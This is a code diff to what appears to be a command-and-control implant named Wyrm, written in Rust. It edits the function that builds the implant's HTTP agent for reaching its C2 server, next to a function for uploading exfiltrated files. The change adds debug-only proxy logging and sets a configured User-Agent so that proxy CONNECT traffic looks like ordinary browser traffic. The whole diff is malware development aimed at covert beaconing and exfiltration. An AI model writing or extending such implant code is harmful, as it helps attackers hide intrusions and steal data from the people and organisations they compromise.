@@ -347,7 +347,19 @@ pub fn upload_file_as_stream(implant: &Wyrm, ef: &ExfiltratedFile) {
 }
 
 fn generate_http_agent(implant: &Wyrm) -> Agent {
+    #[cfg(debug_assertions)]
+    {
+        use crate::utils::console::print_info;
+        print_info("Attempting to get proxy config for C2 connection...");
+    }
+
     if let Some(px) = implant.try_get_proxy() {
+        #[cfg(debug_assertions)]
+        {
+            use crate::utils::console::print_success;
+            print_success(format!("Got proxy config: {}", px));
+        }
+
         let px = Proxy::new(&px).unwrap();
         let config = Config::builder()
             .tls_config(
@@ -357,10 +369,19 @@ fn generate_http_agent(implant: &Wyrm) -> Agent {
                     .build(),
             )
             .proxy(Some(px))
+            // Set the User-Agent in the builder to make sure proxy CONNECT connections have the UA,
+            // as opposed to the ureq UA.
+            .user_agent(implant.c2_config.useragent.clone())
             .build();
 
         config.into()
     } else {
+        #[cfg(debug_assertions)]
+        {
+            use crate::utils::console::print_info;
+            print_info("No proxy detected");
+        }
+
         let config: Config = Config::builder()
             .tls_config(
                 TlsConfig::builder()
@@ -369,6 +390,9 @@ fn generate_http_agent(implant: &Wyrm) -> Agent {
                     .build(),
             )
             .proxy(None)
+            // Set the User-Agent in the builder to make sure proxy CONNECT connections have the UA,
+            // as opposed to the ureq UA.
+            .user_agent(implant.c2_config.useragent.clone())
             .build()
             .into();
 
